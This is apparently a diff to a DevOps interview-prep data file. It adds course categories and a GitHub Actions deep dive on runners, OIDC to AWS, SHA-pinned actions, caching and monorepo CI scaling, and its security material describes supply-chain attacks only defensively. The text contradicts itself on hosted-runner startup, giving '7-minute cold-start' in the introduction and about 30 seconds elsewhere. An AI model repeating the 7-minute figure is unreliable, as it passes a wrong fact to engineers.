@@ -11,15 +11,20 @@
 export const devopsCategories = [
   { id: 'foundations',      name: 'DevOps Foundations & Culture',     icon: 'book',          color: '#3b82f6' },
   { id: 'cicd',             name: 'CI/CD Fundamentals',                icon: 'gitMerge',      color: '#22c55e' },
+  { id: 'cicdtools',        name: 'CI/CD Tools — Practical',           icon: 'tool',          color: '#16a34a' },
   { id: 'delivery',         name: 'Continuous Delivery Practices',    icon: 'send',          color: '#06b6d4' },
+  { id: 'gitops',           name: 'GitOps',                            icon: 'gitPullRequest', color: '#0891b2' },
   { id: 'iac',              name: 'Infrastructure as Code',            icon: 'codepen',       color: '#f59e0b' },
   { id: 'config',           name: 'Configuration Management',          icon: 'settings',      color: '#8b5cf6' },
   { id: 'containers',       name: 'Containers & Images',               icon: 'package',       color: '#ec4899' },
   { id: 'orchestration',    name: 'Orchestration & Kubernetes',        icon: 'gitBranch',     color: '#14b8a6' },
+  { id: 'observability',    name: 'Observability & Telemetry',         icon: 'activity',      color: '#f97316' },
   { id: 'platform',         name: 'Platform Engineering',              icon: 'layers',        color: '#6366f1' },
   { id: 'devsecops',        name: 'DevSecOps',                         icon: 'shield',        color: '#ef4444' },
   { id: 'cloudnative',      name: 'Cloud Native Patterns',             icon: 'cloud',         color: '#0ea5e9' },
   { id: 'datadevops',       name: 'Database & Data DevOps',            icon: 'database',      color: '#a855f7' },
+  { id: 'mlops',            name: 'MLOps & LLMOps',                    icon: 'cpu',           color: '#84cc16' },
+  { id: 'aiops',            name: 'AIOps',                             icon: 'zap',           color: '#d946ef' },
 ];
 
 export const devopsTopicCategoryMap = {
@@ -36,12 +41,27 @@ export const devopsTopicCategoryMap = {
   'test-pyramid':                   'cicd',
   'monorepo-build-systems':         'cicd',
   'trunk-based-development':        'cicd',
+  // CI/CD Tools — Practical Deep Dives
+  'github-actions-deep-dive':       'cicdtools',
+  'jenkins-deep-dive':              'cicdtools',
+  'gitlab-ci-deep-dive':            'cicdtools',
+  'circleci-deep-dive':             'cicdtools',
+  'tekton-pipelines':               'cicdtools',
+  'argo-workflows':                 'cicdtools',
+  'buildkite-runners':              'cicdtools',
   // Continuous Delivery Practices
   'progressive-delivery':           'delivery',
   'feature-flags-platforms':        'delivery',
   'deployment-strategies':          'delivery',
   'database-migrations-cicd':       'delivery',
   'release-engineering':            'delivery',
+  // GitOps
+  'gitops-principles':              'gitops',
+  'argocd-architecture':            'gitops',
+  'fluxcd-architecture':            'gitops',
+  'app-of-apps-pattern':            'gitops',
+  'multi-cluster-gitops':           'gitops',
+  'gitops-drift-recon':             'gitops',
   // Infrastructure as Code
   'iac-fundamentals':               'iac',
   'terraform-internals':            'iac',
@@ -67,6 +87,14 @@ export const devopsTopicCategoryMap = {
   'operators-and-crds':             'orchestration',
   'service-mesh':                   'orchestration',
   'ingress-gateway-api':            'orchestration',
+  // Observability & Telemetry
+  'opentelemetry-fundamentals':     'observability',
+  'distributed-tracing':            'observability',
+  'prometheus-grafana-stack':       'observability',
+  'log-aggregation-stacks':         'observability',
+  'apm-platforms':                  'observability',
+  'ebpf-observability':             'observability',
+  'slo-error-budgets-dashboards':   'observability',
   // Platform Engineering
   'platform-engineering-principles':'platform',
   'internal-developer-platforms':   'platform',
@@ -89,7 +117,19 @@ export const devopsTopicCategoryMap = {
   'db-schema-migrations':           'datadevops',
   'gitops-for-databases':           'datadevops',
   'data-observability-lineage':     'datadevops',
-  'mlops-essentials':               'datadevops',
+  // MLOps & LLMOps
+  'mlops-lifecycle':                'mlops',
+  'feature-stores':                 'mlops',
+  'model-registry-mlflow':          'mlops',
+  'model-serving-kserve-bento':     'mlops',
+  'model-drift-detection':          'mlops',
+  'llmops-evals-prompts':           'mlops',
+  'llm-serving-vllm-tgi':           'mlops',
+  // AIOps
+  'aiops-fundamentals':             'aiops',
+  'anomaly-detection-ml':           'aiops',
+  'alert-correlation-grouping':     'aiops',
+  'incident-rca-ml':                'aiops',
 };
 
 // Topic content lives below — each topic uses the same schema as SRE topics:
@@ -2154,6 +2194,808 @@ What success looks like. Median branch lifetime under 24 hours, p95 under 48 hou
       'https://nvie.com/posts/a-successful-git-branching-model/',
       'https://dora.dev/research/',
       'https://docs.github.com/en/get-started/quickstart/github-flow',
+    ],
+  },
+
+  // ─────────────────────────────────────────────────────────────────────
+  // CT. CI/CD Tools — Practical Deep Dives
+  //   Exemplar topic at interview-grade depth: real YAML, scaling notes,
+  //   debugging recipes, security pitfalls, war-story examples.
+  // ─────────────────────────────────────────────────────────────────────
+  {
+    id: 'github-actions-deep-dive',
+    title: 'GitHub Actions — Workflows, Runners, OIDC, Reusable Workflows',
+    icon: 'github',
+    color: '#16a34a',
+    questions: 6,
+    description: 'The dominant CI/CD platform in 2026 (~33% market share, JetBrains DevEcosystem 2024). Workflow architecture, runner types, OIDC auth to clouds, reusable workflows, supply-chain hardening, scaling patterns at monorepo size.',
+    visualizations: [
+      {
+        title: 'Runner architecture — hosted, self-hosted, and ARC',
+        description: 'Workflow events trigger jobs queued by GitHub\'s scheduler. Hosted runners (ubuntu-latest, macos-latest, windows-latest) run in GitHub-managed VMs with 7-minute startup. Self-hosted runners run on your infrastructure for GPU, ARM, on-prem dependencies. Actions Runner Controller (ARC) on Kubernetes spawns ephemeral pod-per-job for security and elasticity.',
+        image: '/diagrams/devops/ct1-gha.png',
+      },
+      {
+        title: 'Typical PR pipeline — lint, test, security, build, deploy, gate',
+        description: 'Pull request triggers parallel lint, test, security-scan jobs. Build job reuses cache; Docker push to GHCR with SHA-pinned tag. Deploy to staging via OIDC token (no long-lived cloud creds). Branch protection + merge queue gate the merge.',
+        image: '/diagrams/devops/ct1b-gha-workflow.png',
+      },
+    ],
+    introduction: `GitHub Actions launched November 2019, hit GA April 2020, and overtook Jenkins as the most-used CI/CD tool by 2022. JetBrains 2024 State of Developer Ecosystem: ~33% adoption, ahead of Jenkins (~28%) and GitLab CI (~21%). For any team already on GitHub, it's the path of least resistance — but the depth is non-trivial: hosted vs self-hosted runners, OIDC federation, reusable workflows, composite actions, marketplace supply chain, monorepo scaling. This topic is the operational reality.
+
+Architecture in one paragraph. Every workflow lives at .github/workflows/*.yml. GitHub's scheduler watches events (push, pull_request, schedule, workflow_dispatch, repository_dispatch, workflow_call, plus dozens of others). When a workflow triggers, jobs are dispatched to a runner — either a hosted ephemeral VM (GitHub manages the lifecycle, 7-minute cold-start) or a self-hosted runner (you manage). Each job runs as a fresh process; sharing state between jobs requires explicit artifact upload/download or a cache mechanism. Steps within a job share the runner filesystem and process; you can mix uses: actions/checkout@v4 calls with run: shell scripts.
+
+Pricing reality (2026). Hosted Linux is free for public repos, $0.008/min for private (effectively free under most workloads on the free tier; ~3000 free min/month for Pro). Hosted Windows is 2x, hosted macOS is 10x. Larger runners (4-vCPU, 8-vCPU, GPU runners) launched 2023 — useful but expensive. Self-hosted is free in compute (you pay for the VMs/pods); GitHub does not charge for self-hosted minutes.
+
+Why teams still pick something else. Self-hosted Jenkins remains common in air-gapped, regulated, or on-prem environments. GitLab CI remains the default for GitLab shops. Buildkite remains the choice for mega-monorepos that need fine control over agent fleets. CircleCI remains preferred where parallelism-by-test-timing is the default. GitHub Actions is the broadest fit but not always the deepest.
+
+Three load-bearing concepts every interview answer needs:
+
+1. The marketplace + composite actions + reusable workflows as a layered reuse model. Composite actions are inline shell-like steps you can use: across workflows. Reusable workflows (workflow_call trigger) are entire workflow files callable as a unit, with explicit inputs/outputs/secrets. The marketplace is published actions any repo can consume — versioned by tag or SHA. Composing these is what scales GitHub Actions across 30+ services.
+
+2. OIDC federation is the security story. Long-lived AWS access keys in repository secrets are the classic supply-chain attack vector — anyone who compromises your CI runner extracts the key. OIDC instead has GitHub mint a short-lived JWT per job, exchanged with AWS STS / Azure AD / GCP workload-identity for a 1-hour role-assumption. Required for any production-deploy workflow in 2026.
+
+3. Pin actions by SHA, not tag. uses: actions/checkout@v4 follows whatever commit the v4 tag currently points at — and tags are mutable (the action repo maintainer can re-tag at any time). A compromised maintainer or stolen token retags v4 to a malicious commit and every consumer's next workflow run pulls it. Pin to a specific 40-char SHA, comment the version next to it, let Dependabot bump SHAs as new versions come out. The tj-actions/changed-files supply-chain attack of March 2025 was exactly this failure mode at scale.`,
+    whenToUse: [
+      'Designing CI/CD for a new service or migrating off Jenkins/CircleCI/Travis',
+      'Justifying ARC (Actions Runner Controller) on Kubernetes vs scaled hosted runners',
+      'Hardening an existing GHA setup that pins actions by tag and uses long-lived AWS keys',
+      'Scaling CI for a monorepo where 30 minutes of GitHub-hosted minutes per PR is unaffordable',
+      'Architecting reusable workflows for an org where 50 service repos all build Node apps',
+    ],
+    keyConcepts: [
+      {
+        term: 'Workflow file',
+        definition: `Lives at .github/workflows/<name>.yml. Single root, multi-job structure:
+
+\`\`\`yaml
+name: CI
+on:
+  pull_request:
+  push: { branches: [main] }
+concurrency:
+  group: \${{ github.workflow }}-\${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a  # v4.0.0
+        with: { node-version: '20', cache: 'npm' }
+      - run: npm ci && npm test
+\`\`\`
+
+The concurrency block is the single most common omission — without it, pushing twice in a row leaves both runs alive, racing each other. With it, the older run cancels and only the latest progresses.`,
+      },
+      {
+        term: 'Runner types',
+        definition: `Three categories:
+
+GitHub-hosted: ubuntu-latest, ubuntu-22.04, windows-latest, macos-latest, plus larger runners (4-vCPU, 8-vCPU, GPU). Cold-start ~30s. Ephemeral (fresh VM per job). Best for: most workloads.
+
+Self-hosted (classic): you run an agent on a VM/box; jobs land on it. Persistent process; jobs run in the same env unless you explicitly clean up. Easy supply-chain footgun: a compromised job can plant a backdoor in the runner that the next job inherits. Best for: GPU, ARM, on-prem, network access.
+
+Actions Runner Controller (ARC): Kubernetes operator that spawns one ephemeral pod per job. Pod is destroyed on job end; no state persists. Solves the persistent-runner security problem. Best for: orgs with a Kubernetes platform; high-volume self-hosted needs. summerwind/actions-runner-controller (community v0.x) was deprecated 2023; the supported path is actions/actions-runner-controller (gha-runner-scale-set Helm chart, GA 2023).`,
+      },
+      {
+        term: 'OIDC federation to AWS / GCP / Azure',
+        definition: `Replaces long-lived secrets with short-lived federated tokens. Per-job, GitHub mints a JWT with claims like repo:myorg/myrepo:ref:refs/heads/main. AWS IAM trust policy validates the JWT signature against GitHub's OIDC provider and accepts the role-assumption.
+
+\`\`\`yaml
+permissions:
+  id-token: write       # required for OIDC
+  contents: read
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod
+          aws-region: us-east-1
+      - run: aws s3 sync ./dist s3://my-bucket/
+\`\`\`
+
+The IAM role's trust policy restricts which repos / branches / environments can assume it — typical pattern: prod role accepts only main branch of one repo; staging role accepts PRs from the same repo. No long-lived credentials anywhere; rotation is implicit (each job gets a fresh 1-hour token).`,
+      },
+      {
+        term: 'Reusable workflows (workflow_call)',
+        definition: `Full workflow files callable from other workflows. Defined with on: workflow_call: trigger:
+
+\`\`\`yaml
+# .github/workflows/build-node.yml
+on:
+  workflow_call:
+    inputs:
+      node-version: { required: false, type: string, default: '20' }
+      run-tests:    { required: false, type: boolean, default: true }
+    secrets:
+      NPM_TOKEN: { required: true }
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: actions/setup-node@<sha>
+        with: { node-version: \${{ inputs.node-version }} }
+      - run: npm ci
+        env: { NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }} }
+      - if: \${{ inputs.run-tests }}
+        run: npm test
+\`\`\`
+
+Consumed by:
+
+\`\`\`yaml
+jobs:
+  build:
+    uses: myorg/.github/.github/workflows/build-node.yml@v1
+    with:
+      node-version: '22'
+    secrets:
+      NPM_TOKEN: \${{ secrets.NPM_TOKEN }}
+\`\`\`
+
+Nesting limit: 4 levels (caller → callee → callee → callee). Pin the called workflow by SHA or tag. Versioning a central .github repo with semver tags is the canonical pattern for org-wide reuse.`,
+      },
+      {
+        term: 'Composite action',
+        definition: `Reusable steps as a unit, not a full workflow. Lives at action.yml in a repo or path:
+
+\`\`\`yaml
+# .github/actions/setup-stack/action.yml
+name: 'Setup our stack'
+description: 'Node + pnpm + Docker buildx'
+inputs:
+  node-version: { required: false, default: '20' }
+runs:
+  using: 'composite'
+  steps:
+    - uses: pnpm/action-setup@v3
+      with: { version: 9 }
+    - uses: actions/setup-node@<sha>
+      with: { node-version: \${{ inputs.node-version }}, cache: 'pnpm' }
+    - run: pnpm install --frozen-lockfile
+      shell: bash
+\`\`\`
+
+Consumed by uses: ./.github/actions/setup-stack with inputs. Lighter than a reusable workflow; runs in the caller's job (shares filesystem, env). Best for "common 4-step setup" patterns.`,
+      },
+      {
+        term: 'Caching (actions/cache)',
+        definition: `Per-key dependency cache stored in GitHub-managed S3-like backend. 10 GB per repo limit; LRU eviction.
+
+\`\`\`yaml
+- uses: actions/cache@<sha>
+  with:
+    path: |
+      ~/.npm
+      node_modules
+    key: \${{ runner.os }}-node-\${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      \${{ runner.os }}-node-
+\`\`\`
+
+The hashFiles pattern is essential: cache key changes only when lockfile changes. The restore-keys fallback uses an older cache when the exact match misses. setup-node, setup-go, etc. wrap actions/cache with sensible defaults; prefer those for language toolchains.
+
+Cache scope: cached entries are scoped to the branch creating them, with fallback to base branch. Caches written on main are usable from any PR; PR caches are private to the PR until merged.`,
+      },
+      {
+        term: 'Concurrency control',
+        definition: `Without it: a contributor pushes 5 commits in 30 seconds, 5 workflow runs start, all 5 finish, you waste minutes and confuse status checks. With it: only the latest run survives.
+
+\`\`\`yaml
+concurrency:
+  group: \${{ github.workflow }}-\${{ github.ref }}
+  cancel-in-progress: true
+\`\`\`
+
+Use cancel-in-progress: false for deploy jobs (you don't want to interrupt a deploy mid-step). Use cancel-in-progress: true for PR validation jobs (always test the latest commit only).
+
+Concurrency groups also gate exclusive deploys: group: deploy-\${{ inputs.environment }} on a manual-trigger workflow ensures one prod deploy at a time even with multiple PRs trying to ship.`,
+      },
+      {
+        term: 'Matrix strategy',
+        definition: `Run the same job N times across combinations of inputs:
+
+\`\`\`yaml
+jobs:
+  test:
+    runs-on: \${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+        node: ['18', '20', '22']
+        exclude:
+          - { os: macos-latest, node: '18' }
+\`\`\`
+
+That's 3 × 3 - 1 = 8 jobs in parallel. Set fail-fast: false to let all jobs complete even when one fails (default behaviour cancels siblings on first failure, which is rarely what you want for matrix). Use include: to add specific extra combinations not in the cross-product.`,
+      },
+      {
+        term: 'Permissions block (GITHUB_TOKEN)',
+        definition: `Default GITHUB_TOKEN has repo-wide write permissions to most resources. Reduces every successful PR run to a potential supply-chain risk. Best practice: restrict per-workflow:
+
+\`\`\`yaml
+permissions:
+  contents: read         # default minimal
+  id-token: write        # only if using OIDC
+  pull-requests: write   # only if commenting on PRs
+  packages: write        # only if pushing to GHCR
+\`\`\`
+
+Set the org-wide default to read on .github/settings.yml or in org settings; opt in to write per-workflow.`,
+      },
+      {
+        term: 'Action pinning (SHA vs tag)',
+        definition: `Tags are mutable in git — the action repo maintainer can move v4 to point at a different commit. The tj-actions/changed-files supply-chain attack of March 2025 demonstrated this: an attacker compromised the maintainer\'s account, retagged stable releases to point at a malicious commit that exfiltrated repository secrets to a remote endpoint. Every consumer pinning by tag was instantly compromised.
+
+The fix:
+
+\`\`\`yaml
+- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+\`\`\`
+
+The 40-char SHA is content-addressed — if upstream re-tags, your reference still points at the original commit. Comment the human-readable version. Dependabot can update SHAs automatically with PRs.
+
+Per StepSecurity\'s guide: SHA-pin every third-party action. Tags are acceptable only for actions you own or trust unconditionally (and even then, SHA pin is safer).`,
+      },
+    ],
+    approach: [
+      'Start every workflow with explicit `on:` triggers, `concurrency:` control, and `permissions:` reduced to minimum',
+      'Use OIDC federation to clouds — no `AWS_ACCESS_KEY_ID` in secrets, ever',
+      'Pin every third-party action by 40-char SHA with a `# v1.2.3` comment; let Dependabot bump',
+      'Compose with reusable workflows (whole pipeline shells) + composite actions (small step bundles); avoid copy-pasting between repos',
+      'Cache dependencies aggressively via setup-* actions; cache builds with GHA cache action when sensible',
+      'Use matrix strategy with fail-fast: false for cross-platform / cross-version test',
+      'Set up a merge queue for high-traffic main branches (GA 2023) — handles the "PR was green but rebase made it red" failure mode',
+      'For monorepos: combine paths-filter or dorny/paths-filter to skip jobs whose code didn\'t change; layer over a real monorepo build system (Turborepo / Nx / Bazel) for full incrementality',
+      'Self-host via Actions Runner Controller (gha-runner-scale-set Helm chart) on K8s for GPU / on-prem / volume — never on persistent VMs',
+    ],
+    pitfalls: [
+      'Pinning actions by tag instead of SHA (tj-actions/changed-files attack, March 2025) — silent supply-chain compromise',
+      'Long-lived cloud credentials in repo secrets — single CI compromise leaks production access; OIDC eliminates this entirely',
+      'No concurrency block — push three commits in a row, watch three workflow runs race each other and burn minutes',
+      'Persistent self-hosted runners on long-lived VMs — one compromised job plants a backdoor every subsequent job inherits; use ARC ephemeral pods',
+      'Default GITHUB_TOKEN permissions left at write-everything — every action you run can in principle modify the repo, comment on PRs, push packages',
+      'fail-fast: true on matrix (the default) — one platform fails, you lose visibility into whether others would have failed too; almost always want fail-fast: false',
+      'Putting heavy logic in YAML heredocs — 200-line shell script in a `run: |` block is unreadable and untestable; move to a script in the repo and call it from the workflow',
+      'Reusable workflows referenced by `@main` instead of `@v1.4.2` — central-repo breaking change silently breaks 30 downstream pipelines',
+      'No artifact retention policy — uploaded artifacts default to 90 days; CI artifact storage bills sneak up fast',
+      'Workflow-level secrets exposed to forks — `pull_request` from a fork has access to most secrets unless you set them as environment-protected; default-deny is safer',
+    ],
+    keyQuestions: [
+      {
+        question: 'Walk through GitHub Actions runner types and when you\'d pick each.',
+        answer: `Three runner types, three operational profiles. The choice matters because it drives cost, security, and capability.
+
+GitHub-hosted runners. The default. ubuntu-latest, ubuntu-22.04, windows-latest, macos-latest, plus larger flavors (4-vCPU, 8-vCPU, 16-vCPU, GPU runners) launched in 2023. Each job runs in a fresh ephemeral VM provisioned by GitHub; cold-start is roughly 30 seconds; the VM is destroyed after the job. Filesystem isolation is total between jobs. Pricing: free for public repos; $0.008/min for private Linux, 2x for Windows, 10x for macOS. Most teams on the Pro plan get 3000 free private minutes/month, which covers a moderate workload but not heavy CI for a busy monorepo.
+
+When to pick: most workloads. Standard build/test/deploy without specialized hardware. Public OSS projects. Anything where you don\'t want to operate runner infrastructure.
+
+When NOT: GPU workloads (only specialized larger runners support GPU, and they\'re expensive); ARM-only software (limited ARM hosted runners as of 2026); on-prem dependencies (private package mirrors, internal databases); air-gapped environments; volume that exceeds your minute budget by 10x or more.
+
+Self-hosted runners (classic). You install the runner agent on a VM, container, or bare-metal box. The runner registers with GitHub, polls for jobs, executes them in its own process. Multiple jobs can hit the same runner serially; state persists between jobs unless you explicitly clean up.
+
+When to pick: GPU/ARM/specialized hardware that hosted doesn\'t cover; on-prem dependencies; air-gapped; high volume where the per-minute hosted cost exceeds your VM cost amortized.
+
+When NOT — and this is the critical part: as a long-lived persistent VM. The supply-chain attack story is brutal. Persistent runners run jobs from many sources: feature branches from your team, PRs from contractors, sometimes PRs from forks. A malicious or compromised PR can plant a backdoor in the runner — modify .bashrc, install a daemon, plant a webshell — that the next job inherits. Once a persistent runner is compromised, every subsequent job (including production deploys) runs against a tainted environment. GitHub explicitly warns against using self-hosted runners with public repositories for this reason.
+
+Actions Runner Controller (ARC). The supported answer to "I need self-hosted but without the persistent-runner footgun." ARC is a Kubernetes operator that spawns one ephemeral pod per job. Pod is destroyed on job completion. No state persists.
+
+The deployment shape: install the actions/actions-runner-controller Helm chart (gha-runner-scale-set, GA 2023). Configure a runner scale set targeting your repo or org. The chart watches GitHub for queued jobs, scales pod count up to demand, scales down on idle. Each pod is short-lived; KEDA-style scaling can drop it to zero when there\'s no work.
+
+When to pick: orgs with a Kubernetes platform team; medium-to-high self-hosted volume; security-conscious environments; need for elasticity (CI bursts during business hours, idle overnight). Combined with cluster-autoscaler or Karpenter, you get cost-efficient elastic CI capacity.
+
+When NOT: small teams without K8s expertise — operating ARC adds platform overhead. Small volume — the overhead isn\'t worth it.
+
+Practical decision tree: hosted by default. ARC for self-hosted needs (volume, GPU, on-prem) when you have K8s. Classic self-hosted only as a last resort, on ephemeral VMs (image-baked, destroyed after each job) or in dev-only contexts.
+
+Operational note for ARC specifically: as of 2026, the original community summerwind/actions-runner-controller is deprecated. The supported path is actions/actions-runner-controller with the gha-runner-scale-set chart. Don\'t adopt the deprecated version for new deployments. Migration from summerwind to gha-runner-scale-set is documented but non-trivial.`,
+      },
+      {
+        question: 'Show me how OIDC federation to AWS works and why it replaces long-lived keys.',
+        answer: `Long-lived AWS credentials in repository secrets are a primary supply-chain attack vector. Anyone who compromises a CI run — malicious dependency, malicious action, attacker with token access — extracts AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from the environment and now has whatever IAM permissions the role grants. There is no rotation that\'s fast enough; by the time you notice, the attacker has already pivoted.
+
+OIDC federation eliminates the long-lived credential entirely. GitHub Actions has an OIDC provider that mints a short-lived JWT per job. AWS IAM has a trust policy that accepts JWTs from GitHub\'s OIDC provider, validates the signature, inspects the claims (which repo, which branch, which environment), and assumes a role for the job — for one hour, scoped to that job.
+
+The setup, in three pieces:
+
+Piece 1 — register GitHub as an OIDC provider in AWS IAM. One-time per account. Provider URL: https://token.actions.githubusercontent.com. Audience: sts.amazonaws.com. Done via Terraform (aws_iam_openid_connect_provider) or click-ops. The provider\'s thumbprints (SSL certificate fingerprints) are required; AWS docs maintain the current set.
+
+Piece 2 — create an IAM role with a trust policy that accepts the OIDC JWT and restricts which workflows can assume it.
+
+\`\`\`json
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {
+      "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
+    },
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": {
+        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
+      },
+      "StringLike": {
+        "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
+      }
+    }
+  }]
+}
+\`\`\`
+
+The sub claim is the load-bearing condition. repo:myorg/myrepo:ref:refs/heads/main means: only jobs from main branch of this exact repo can assume this role. PRs from forks cannot assume it. Other branches cannot assume it. You can scope further with environment claims: repo:myorg/myrepo:environment:production for "only when the workflow uses environment: production with reviewer approval."
+
+Piece 3 — workflow uses configure-aws-credentials with the role ARN.
+
+\`\`\`yaml
+permissions:
+  id-token: write        # required for OIDC
+  contents: read
+jobs:
+  deploy:
+    environment: production
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod
+          aws-region: us-east-1
+      - run: aws s3 sync ./dist s3://my-bucket/
+      - run: aws cloudfront create-invalidation --distribution-id E123 --paths /*
+\`\`\`
+
+What happens at runtime: GitHub\'s scheduler dispatches the job. The runner gets a JWT from GitHub\'s OIDC endpoint with claims for this specific run. configure-aws-credentials calls AWS STS AssumeRoleWithWebIdentity, passing the JWT. STS validates the signature against GitHub\'s OIDC provider, evaluates the trust policy conditions, and returns temporary credentials (1-hour lifetime). The action exports the credentials as environment variables. Subsequent aws CLI calls use them. When the job finishes, the credentials expire; nothing persists.
+
+Why it\'s strictly better:
+
+No long-lived credential anywhere. Nothing to rotate, nothing to leak, nothing to revoke under pressure during incident response.
+
+Per-job audit trail. CloudTrail logs the AssumeRoleWithWebIdentity call with the OIDC sub claim. You know exactly which workflow run from which commit assumed the role.
+
+Granular trust. Different workflows can assume different roles with different permissions. main branch deploys can assume a prod role; PRs can assume a staging-only role; nightly builds can assume a separate role with snapshot permissions.
+
+Defense in depth with environments. Combine with GitHub Environments + required reviewers: assume the prod role only after a human approves the deployment. Even a compromised main can\'t auto-deploy to prod.
+
+The same pattern works for GCP (Workload Identity Federation), Azure (federated identity credentials on a service principal), HashiCorp Vault, and any other JWT-aware authority. By 2026, OIDC federation is the table-stakes cloud-auth pattern for CI; long-lived keys are deprecated practice.
+
+Migration story for an existing AWS-keys workflow: create the OIDC provider, create a role with a trust policy matching your workflow, swap the configure-aws-credentials inputs (drop access-key-id, add role-to-assume), test on a feature branch, delete the old IAM user and remove the secrets. Total work: under an hour for a simple workflow; longer if you have many roles with different permission scopes.`,
+      },
+      {
+        question: 'How do you scale GitHub Actions for a monorepo where every PR triggers 30 minutes of CI?',
+        answer: `Three orthogonal strategies, layered together: kill jobs that don\'t need to run, parallelize the ones that do, and use the right runners. The combined effect is going from 30 minutes per PR to 3-8 minutes for typical changes.
+
+Strategy 1: paths filtering — skip jobs whose code didn\'t change. The cheapest win.
+
+\`\`\`yaml
+jobs:
+  paths:
+    runs-on: ubuntu-latest
+    outputs:
+      backend:  \${{ steps.filter.outputs.backend }}
+      frontend: \${{ steps.filter.outputs.frontend }}
+      infra:    \${{ steps.filter.outputs.infra }}
+    steps:
+      - uses: dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36  # v3.0.2
+        id: filter
+        with:
+          filters: |
+            backend: 'apps/backend/**'
+            frontend: 'apps/frontend/**'
+            infra: 'infra/**'
+  backend-test:
+    needs: paths
+    if: \${{ needs.paths.outputs.backend == 'true' }}
+    runs-on: ubuntu-latest
+    steps: [...]
+\`\`\`
+
+This handles the "I changed a README, why am I running 30 minutes of tests" case immediately. For more sophisticated change detection, layer over a real monorepo build system (Turborepo, Nx, Bazel) — they compute affected projects from a build graph, not just file paths.
+
+Strategy 2: matrix sharding — run the test suite in parallel slices.
+
+A 12-minute test suite split into 6 shards of 2 minutes each, running in parallel:
+
+\`\`\`yaml
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6]
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: npm ci
+      - run: npm test -- --shard=\${{ matrix.shard }}/6
+\`\`\`
+
+Most test runners (Jest, Vitest, pytest-shard, Go\'s -shard flag) support sharding natively. Combined with hosted runner free tier, 6 shards × 2 min × $0.008/min = $0.10 per CI run vs $0.10 for a single 12-minute job. Same money, 1/6 the wall-clock latency.
+
+Strategy 3: aggressive caching. setup-node, setup-go, setup-python, etc. cache their respective dependency stores via actions/cache with sensible defaults. Docker layer cache via type=gha for buildx:
+
+\`\`\`yaml
+- uses: docker/setup-buildx-action@<sha>
+- uses: docker/build-push-action@<sha>
+  with:
+    context: .
+    push: true
+    tags: ghcr.io/myorg/myapp:\${{ github.sha }}
+    cache-from: type=gha
+    cache-to: type=gha,mode=max
+\`\`\`
+
+Cache hit rate of 80-95% is achievable on most JS/Go/Python repos. A 5-minute "fresh install" becomes 30 seconds with a warm cache.
+
+Strategy 4: monorepo build system with remote cache. The big win for 30+ package monorepos.
+
+Turborepo: turbo run build test --cache-dir=.turbo. With Turborepo\'s remote cache (Vercel-hosted free tier or self-hosted), a change in one package skips builds and tests for the unaffected 25 packages. A 12-minute "rebuild everything" pipeline becomes 1-2 minutes for a typical change.
+
+Nx: nx affected --target=test computes the affected subset of the project graph from git changes; nx-cloud caches outputs across CI runs.
+
+Bazel: hermetic builds with remote cache (Buildbarn, BuildBuddy, EngFlow). Maximum hermeticity; steepest learning curve.
+
+Combine these, plus paths filtering above, and CI cost goes from "rebuild everything every PR" to "rebuild and test only what actually changed plus its transitive dependents."
+
+Strategy 5: larger runners for build-bottleneck jobs. The 4-vCPU and 8-vCPU GitHub-hosted runners (priced 2x and 4x the base ubuntu-latest) often produce more than 2x speedup for parallel builds. A 10-minute Webpack build on 2-vCPU might be 4 minutes on 8-vCPU. Math: 4 minutes × 4x cost = 16 minute-equivalents, vs 10 minutes × 1x = 10 minute-equivalents. The larger runner costs 60% more for 60% time savings. Whether that\'s worth it depends on whether the latency or the cost is the binding constraint.
+
+Strategy 6: ARC for monorepo CI volume. If your CI volume is high enough that hosted minutes become real money (>5000 minutes/day), ARC on Kubernetes with cluster-autoscaler / Karpenter often beats hosted on cost. Each pod is sized appropriately for its job (CPU-intensive jobs on big nodes; quick jobs on small nodes); the K8s scheduler bin-packs efficiently.
+
+Strategy 7: merge queue for the "PR was green but rebase makes it red" problem. As repo activity scales, you hit the situation where PR A is green, PR B is green, but A merging breaks B. Merge queue (GA 2023) serializes the merge: it rebases PRs in queue order and re-runs CI on the rebased state before merging. Saves the "spend an hour debugging why main is broken after merge" cost.
+
+Real-world combination for a 100-package JS monorepo: Turborepo with remote cache + paths filter for non-Turborepo paths (infra, docs) + matrix sharding for the slowest test suites + aggressive caching + 4-vCPU runners for the build job + ARC for self-hosted volume. PRs that touch one package finish in 2-3 minutes; PRs that touch many packages or cross-cutting concerns finish in 8-12 minutes. The 30-minute "rebuild everything" baseline is gone.
+
